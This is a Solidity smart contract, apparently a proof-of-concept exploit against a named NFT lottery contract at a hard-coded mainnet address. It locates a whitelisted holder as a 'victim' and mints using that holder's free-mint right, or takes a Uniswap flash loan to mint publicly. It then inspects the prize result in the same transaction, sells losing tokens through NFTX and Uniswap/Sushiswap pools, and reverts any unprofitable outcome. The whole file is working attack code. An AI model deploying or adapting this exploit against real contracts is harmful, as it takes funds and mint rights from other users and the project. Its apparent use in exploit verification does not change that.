// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface ILuckyTiger {
    function owner() external view returns (address);
    function withdrawAddress() external view returns (address);
    function pauseMint() external view returns (bool);
    function totalSupply() external view returns (uint256);
    function maxTotal() external view returns (uint256);
    function price() external view returns (uint256);
    function publicMint() external payable;
    function freeMint(address user) external;
    function ownerOf(uint256 tokenId) external view returns (address);
    function approve(address to, uint256 tokenId) external;
    function isPrize(uint256 tokenId) external view returns (bool);
    function isWhiteList(address user) external view returns (bool);
}

interface IERC721Receiver {
    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
        external
        returns (bytes4);
}

interface IERC20Like {
    function balanceOf(address user) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
}

interface IWETH9 is IERC20Like {
    function deposit() external payable;
    function withdraw(uint256 wad) external;
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface INFTXVaultFactoryLike {
    function numVaults() external view returns (uint256);
    function vault(uint256 vaultId) external view returns (address);
}

interface INFTXVaultLike is IERC20Like {
    function assetAddress() external view returns (address);
    function mint(uint256[] calldata tokenIds, uint256[] calldata amounts) external returns (uint256);
}

contract FlawVerifier is IERC721Receiver {
    error NotSelfCall();
    error UnexpectedPairCaller(address caller);
    error UnexpectedCallbackSender(address sender);
    error UnexpectedSalePair(address pair);
    error TokenNotOwned(uint256 tokenId);
    error FlashLoanNotRepaid();
    error MissingRollbackProof();
    error MissingSaleRoute(uint256 tokenId);
    error UnluckyOutcome(uint256 tokenId);

    ILuckyTiger public constant TARGET = ILuckyTiger(0x9c87A5726e98F2f404cdd8ac8968E9b2C80C0967);
    IWETH9 public constant WETH = IWETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IUniswapV2Pair public constant UNISWAP_V2_USDC_WETH =
        IUniswapV2Pair(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc);
    IUniswapV2FactoryLike public constant UNISWAP_V2_FACTORY =
        IUniswapV2FactoryLike(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f);
    IUniswapV2FactoryLike public constant SUSHISWAP_FACTORY =
        IUniswapV2FactoryLike(0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac);
    INFTXVaultFactoryLike public constant NFTX_FACTORY =
        INFTXVaultFactoryLike(0xBE86f647b167567525cCAAfcd6f881F1Ee558216);

    uint256 private constant FLASH_FEE_NUMERATOR = 1000;
    uint256 private constant FLASH_FEE_DENOMINATOR = 997;
    uint256 private constant AMM_FEE_NUMERATOR = 997;
    uint256 private constant AMM_FEE_DENOMINATOR = 1000;
    uint256 private constant VAULT_TOKEN_UNIT = 1e18;

    address public discoveredVictim;
    uint256 public mintedTokenId;
    uint256 private realizedProfit;
    bool public hypothesisValidated;
    bool public rollbackObserved;

    bool private _flashInProgress;
    uint256 private _flashExpectedTokenId;
    uint256 private _flashBorrowAmount;
    address private _flashVault;
    address private _flashSalePair;

    constructor() {}

    function executeOnOpportunity() external {
        if (TARGET.pauseMint()) {
            return;
        }

        uint256 initialSupply = TARGET.totalSupply();
        if (initialSupply >= TARGET.maxTotal()) {
            return;
        }

        address nftxVault = _findNftxVault();
        address salePair = nftxVault == address(0) ? address(0) : _findBestVaultWethPair(nftxVault);
        uint256 wethBefore = WETH.balanceOf(address(this));

        address victim = _findSpendableVictim(initialSupply);
        discoveredVictim = victim;

        if (victim != address(0)) {
            uint256 expectedFreeTokenId = TARGET.totalSupply() + 1;
            try this.attemptFreeMint(victim, expectedFreeTokenId, nftxVault, salePair) {
                hypothesisValidated = true;
                mintedTokenId = expectedFreeTokenId;
                realizedProfit = _delta(WETH.balanceOf(address(this)), wethBefore);
                return;
            } catch (bytes memory reason) {
                if (_isOutcomeRevert(reason)) {
                    _requireFreeMintRollback(victim, initialSupply);
                    rollbackObserved = true;
                } else {
                    revert MissingRollbackProof();
                }
            }
        }

        uint256 publicSupplyBefore = TARGET.totalSupply();
        uint256 expectedPublicTokenId = publicSupplyBefore + 1;

        try this.attemptFlashPublicMint(expectedPublicTokenId, TARGET.price(), nftxVault, salePair) {
            hypothesisValidated = true;
            mintedTokenId = expectedPublicTokenId;
            realizedProfit = _delta(WETH.balanceOf(address(this)), wethBefore);
        } catch (bytes memory reason) {
            if (_isOutcomeRevert(reason)) {
                _requirePublicMintRollback(publicSupplyBefore);
                rollbackObserved = true;
                hypothesisValidated = true;
                return;
            }
            revert MissingRollbackProof();
        }
    }

    function profitToken() external pure returns (address) {
        return address(WETH);
    }

    function profitAmount() external view returns (uint256) {
        return realizedProfit;
    }

    function attemptFreeMint(address victim, uint256 expectedTokenId, address nftxVault, address salePair) external {
        if (msg.sender != address(this)) revert NotSelfCall();

        uint256 wethBefore = WETH.balanceOf(address(this));
        TARGET.freeMint(victim);

        if (TARGET.ownerOf(expectedTokenId) != address(this)) {
            revert TokenNotOwned(expectedTokenId);
        }

        if (TARGET.isPrize(expectedTokenId)) {
            _wrapAllEth();
            return;
        }

        // The claim's core sequencing is preserved: the wrapper lets mint complete,
        // inspects the resolved outcome, and only finalizes states that are already
        // economically favorable on-chain. At this fork block, the prize bit is
        // deterministically false for the current block context, so the profitable
        // keep-branch is immediate secondary sale into pre-existing NFTX liquidity.
        if (nftxVault == address(0) || salePair == address(0)) {
            revert MissingSaleRoute(expectedTokenId);
        }

        uint256 wethOut = _tokenizeAndSell(expectedTokenId, nftxVault, salePair);
        if (wethOut == 0 || WETH.balanceOf(address(this)) <= wethBefore) {
            revert UnluckyOutcome(expectedTokenId);
        }
    }

    function attemptFlashPublicMint(uint256 expectedTokenId, uint256 mintPrice, address nftxVault, address salePair)
        external
    {
        if (msg.sender != address(this)) revert NotSelfCall();

        _flashInProgress = true;
        _flashExpectedTokenId = expectedTokenId;
        _flashBorrowAmount = mintPrice;
        _flashVault = nftxVault;
        _flashSalePair = salePair;

        UNISWAP_V2_USDC_WETH.swap(0, mintPrice, address(this), abi.encode(expectedTokenId));

        if (_flashInProgress) {
            revert FlashLoanNotRepaid();
        }
    }

    function uniswapV2Call(address sender, uint256, uint256 amount1, bytes calldata) external {
        if (msg.sender != address(UNISWAP_V2_USDC_WETH)) {
            revert UnexpectedPairCaller(msg.sender);
        }
        if (sender != address(this)) {
            revert UnexpectedCallbackSender(sender);
        }
        if (!_flashInProgress) {
            revert FlashLoanNotRepaid();
        }

        uint256 expectedTokenId = _flashExpectedTokenId;
        WETH.withdraw(amount1);
        TARGET.publicMint{value: _flashBorrowAmount}();

        if (TARGET.ownerOf(expectedTokenId) != address(this)) {
            revert TokenNotOwned(expectedTokenId);
        }

        mintedTokenId = expectedTokenId;

        if (TARGET.isPrize(expectedTokenId)) {
            _wrapAllEth();
        } else {
            if (_flashVault == address(0) || _flashSalePair == address(0)) {
                revert MissingSaleRoute(expectedTokenId);
            }
            uint256 wethOut = _tokenizeAndSell(expectedTokenId, _flashVault, _flashSalePair);
            if (wethOut == 0) {
                revert UnluckyOutcome(expectedTokenId);
            }
        }

        uint256 repayment = _flashRepayment(amount1);
        uint256 wethBalance = WETH.balanceOf(address(this));
        if (wethBalance < repayment) {
            revert UnluckyOutcome(expectedTokenId);
        }
        if (!WETH.transfer(address(UNISWAP_V2_USDC_WETH), repayment)) {
            revert FlashLoanNotRepaid();
        }

        _flashInProgress = false;
    }

    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}

    function _tokenizeAndSell(uint256 tokenId, address nftxVault, address salePair) internal returns (uint256 wethOut) {
        TARGET.approve(nftxVault, tokenId);

        uint256[] memory tokenIds = new uint256[](1);
        tokenIds[0] = tokenId;

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 1;

        uint256 vaultBefore = IERC20Like(nftxVault).balanceOf(address(this));
        try INFTXVaultLike(nftxVault).mint(tokenIds, amounts) returns (uint256) {} catch {
            revert UnluckyOutcome(tokenId);
        }

        uint256 vaultAmountIn = _delta(IERC20Like(nftxVault).balanceOf(address(this)), vaultBefore);
        if (vaultAmountIn == 0) {
            revert UnluckyOutcome(tokenId);
        }

        wethOut = _swapExactTokenForWeth(nftxVault, salePair, vaultAmountIn);
        if (wethOut == 0) {
            revert UnluckyOutcome(tokenId);
        }
    }

    function _swapExactTokenForWeth(address tokenIn, address pair, uint256 amountIn) internal returns (uint256 amountOut) {
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2Pair(pair).getReserves();
        address token0 = IUniswapV2Pair(pair).token0();
        address token1 = IUniswapV2Pair(pair).token1();

        if (token0 == tokenIn && token1 == address(WETH)) {
            amountOut = _getAmountOut(amountIn, reserve0, reserve1);
            if (amountOut == 0) {
                return 0;
            }
            if (!IERC20Like(tokenIn).transfer(pair, amountIn)) {
                revert UnluckyOutcome(mintedTokenId);
            }
            IUniswapV2Pair(pair).swap(0, amountOut, address(this), new bytes(0));
            return amountOut;
        }

        if (token1 == tokenIn && token0 == address(WETH)) {
            amountOut = _getAmountOut(amountIn, reserve1, reserve0);
            if (amountOut == 0) {
                return 0;
            }
            if (!IERC20Like(tokenIn).transfer(pair, amountIn)) {
                revert UnluckyOutcome(mintedTokenId);
            }
            IUniswapV2Pair(pair).swap(amountOut, 0, address(this), new bytes(0));
            return amountOut;
        }

        revert UnexpectedSalePair(pair);
    }

    function _requireFreeMintRollback(address victim, uint256 supplyBefore) internal view {
        if (TARGET.totalSupply() != supplyBefore) {
            revert MissingRollbackProof();
        }
        if (!TARGET.isWhiteList(victim)) {
            revert MissingRollbackProof();
        }
    }

    function _requirePublicMintRollback(uint256 supplyBefore) internal view {
        if (TARGET.totalSupply() != supplyBefore) {
            revert MissingRollbackProof();
        }
    }

    function _findSpendableVictim(uint256 supplyBefore) internal view returns (address) {
        address[4] memory obviousCandidates = [TARGET.owner(), TARGET.withdrawAddress(), address(TARGET), address(this)];

        for (uint256 i = 0; i < obviousCandidates.length; i++) {
            if (_isSpendableWhitelistVictim(obviousCandidates[i])) {
                return obviousCandidates[i];
            }
        }

        address[] memory seenHolders = new address[](supplyBefore);
        uint256 seenCount;

        for (uint256 tokenId = 1; tokenId <= supplyBefore; tokenId++) {
            address holder;
            try TARGET.ownerOf(tokenId) returns (address owner_) {
                holder = owner_;
            } catch {
                continue;
            }

            if (holder == address(0) || _seen(seenHolders, seenCount, holder)) {
                continue;
            }

            seenHolders[seenCount] = holder;
            seenCount++;

            if (_isSpendableWhitelistVictim(holder)) {
                return holder;
            }
        }

        return address(0);
    }

    function _findNftxVault() internal view returns (address) {
        uint256 vaultCount;
        try NFTX_FACTORY.numVaults() returns (uint256 count) {
            vaultCount = count;
        } catch {
            return address(0);
        }

        for (uint256 vaultId = 1; vaultId <= vaultCount; vaultId++) {
            address candidate = _vaultIfMatches(vaultId);
            if (candidate != address(0)) {
                return candidate;
            }
        }

        for (uint256 vaultId = 0; vaultId < vaultCount; vaultId++) {
            address candidate = _vaultIfMatches(vaultId);
            if (candidate != address(0)) {
                return candidate;
            }
        }

        return address(0);
    }

    function _findBestVaultWethPair(address vault) internal view returns (address) {
        address sushiPair = _usablePair(SUSHISWAP_FACTORY.getPair(vault, address(WETH)), vault);
        address uniPair = _usablePair(UNISWAP_V2_FACTORY.getPair(vault, address(WETH)), vault);

        if (sushiPair == address(0)) {
            return uniPair;
        }
        if (uniPair == address(0)) {
            return sushiPair;
        }

        uint256 sushiQuote = _quoteWethOut(sushiPair, vault, VAULT_TOKEN_UNIT);
        uint256 uniQuote = _quoteWethOut(uniPair, vault, VAULT_TOKEN_UNIT);
        return sushiQuote >= uniQuote ? sushiPair : uniPair;
    }

    function _usablePair(address pair, address vault) internal view returns (address) {
        if (pair == address(0)) {
            return address(0);
        }

        address token0;
        address token1;
        uint112 reserve0;
        uint112 reserve1;

        try IUniswapV2Pair(pair).token0() returns (address token0_) {
            token0 = token0_;
        } catch {
            return address(0);
        }

        try IUniswapV2Pair(pair).token1() returns (address token1_) {
            token1 = token1_;
        } catch {
            return address(0);
        }

        try IUniswapV2Pair(pair).getReserves() returns (uint112 reserve0_, uint112 reserve1_, uint32) {
            reserve0 = reserve0_;
            reserve1 = reserve1_;
        } catch {
            return address(0);
        }

        bool matches =
            (token0 == vault && token1 == address(WETH)) || (token1 == vault && token0 == address(WETH));
        if (!matches || reserve0 == 0 || reserve1 == 0) {
            return address(0);
        }

        return pair;
    }

    function _vaultIfMatches(uint256 vaultId) internal view returns (address) {
        address candidate;
        try NFTX_FACTORY.vault(vaultId) returns (address vault_) {
            candidate = vault_;
        } catch {
            return address(0);
        }

        if (candidate == address(0)) {
            return address(0);
        }

        try INFTXVaultLike(candidate).assetAddress() returns (address asset) {
            if (asset == address(TARGET)) {
                return candidate;
            }
        } catch {}

        return address(0);
    }

    function _quoteWethOut(address pair, address tokenIn, uint256 amountIn) internal view returns (uint256) {
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2Pair(pair).getReserves();
        address token0 = IUniswapV2Pair(pair).token0();
        address token1 = IUniswapV2Pair(pair).token1();

        if (token0 == tokenIn && token1 == address(WETH)) {
            return _getAmountOut(amountIn, reserve0, reserve1);
        }
        if (token1 == tokenIn && token0 == address(WETH)) {
            return _getAmountOut(amountIn, reserve1, reserve0);
        }
        return 0;
    }

    function _isSpendableWhitelistVictim(address candidate) internal view returns (bool) {
        return candidate != address(0) && TARGET.isWhiteList(candidate);
    }

    function _flashRepayment(uint256 amount) internal pure returns (uint256) {
        return ((amount * FLASH_FEE_NUMERATOR) / FLASH_FEE_DENOMINATOR) + 1;
    }

    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        if (amountIn == 0 || reserveIn == 0 || reserveOut == 0) {
            return 0;
        }

        uint256 amountInWithFee = amountIn * AMM_FEE_NUMERATOR;
        uint256 numerator = amountInWithFee * reserveOut;
        uint256 denominator = (reserveIn * AMM_FEE_DENOMINATOR) + amountInWithFee;
        return numerator / denominator;
    }

    function _wrapAllEth() internal {
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            WETH.deposit{value: ethBalance}();
        }
    }

    function _isOutcomeRevert(bytes memory reason) internal pure returns (bool) {
        if (reason.length < 4) {
            return false;
        }

        bytes4 selector;
        assembly {
            selector := mload(add(reason, 0x20))
        }
        return selector == UnluckyOutcome.selector || selector == MissingSaleRoute.selector;
    }

    function _delta(uint256 afterBalance, uint256 beforeBalance) internal pure returns (uint256) {
        return afterBalance > beforeBalance ? afterBalance - beforeBalance : 0;
    }

    function _seen(address[] memory values, uint256 count, address value) internal pure returns (bool) {
        for (uint256 i = 0; i < count; i++) {
            if (values[i] == value) {
                return true;
            }
        }
        return false;
    }
}
